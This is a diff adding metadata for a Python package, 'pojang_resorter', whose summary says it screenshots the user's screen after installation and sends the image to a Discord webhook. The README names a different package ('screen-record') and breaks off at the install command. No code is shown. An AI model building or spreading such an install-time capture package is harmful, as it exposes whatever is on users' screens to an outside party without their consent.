@@ -1,0 +1,29 @@
+Metadata-Version: 2.1
+Name: pojang_resorter
+Version: 0.2
+Summary: A package that takes a screenshot and sends it to a Discord webhook after installation.
+Home-page: https://github.com/yourusername/pojang_resorter
+Author: Your Name
+Author-email: your.email@example.com
+Classifier: Development Status :: 3 - Alpha
+Classifier: Intended Audience :: Developers
+Classifier: License :: OSI Approved :: MIT License
+Classifier: Programming Language :: Python :: 3.12
+Classifier: Programming Language :: Python :: 3.11
+Classifier: Programming Language :: Python :: 3.10
+Classifier: Programming Language :: Python :: 3.9
+Description-Content-Type: text/markdown
+License-File: LICENSE
+Requires-Dist: Pillow
+Requires-Dist: requests
+
+# screen-record
+
+This is a sample package that runs a script after installation.
+
+## Installation
+
+You can install this package using pip:
+
+```bash
+pip install screen-record
